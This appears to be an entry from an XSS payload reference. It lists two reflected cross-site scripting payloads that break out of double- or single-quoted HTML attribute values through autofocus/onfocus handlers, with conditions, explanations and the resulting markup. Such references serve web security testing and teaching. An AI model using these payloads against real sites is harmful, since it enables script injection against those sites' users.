1. XSS inside an Attribute Value inside a Tag (Double Quote)
- Payload: " autofocus onfocus="alert(1)
- Condition: Input is reflected inside an attribute value within an HTML tag where angle brackets (< >) are encoded
- Case: Angle brackets are encoded but double quotes are not filtered, allowing breakout from the attribute. This payload only works in HTML attribute contexts (e.g. value="...") — it does NOT work inside a <script> tag because autofocus/onfocus are HTML event attributes, not JavaScript syntax
- Output: <input type="text" value="" autofocus onfocus="alert(1)">

---

2. XSS inside an Attribute Value inside a Tag (Single Quote)
- Payload: ' autofocus onfocus='alert(1)
- Condition: Input is reflected inside an attribute value within an HTML tag where angle brackets (< >) are encoded
- Case: Angle brackets are encoded but single quotes are not filtered, allowing breakout from the attribute. This payload only works in HTML attribute contexts (e.g. value='...') — it does NOT work inside a <script> tag because autofocus/onfocus are HTML event attributes, not JavaScript syntax
- Output: <input type="text" value='' autofocus onfocus='alert(1)'>
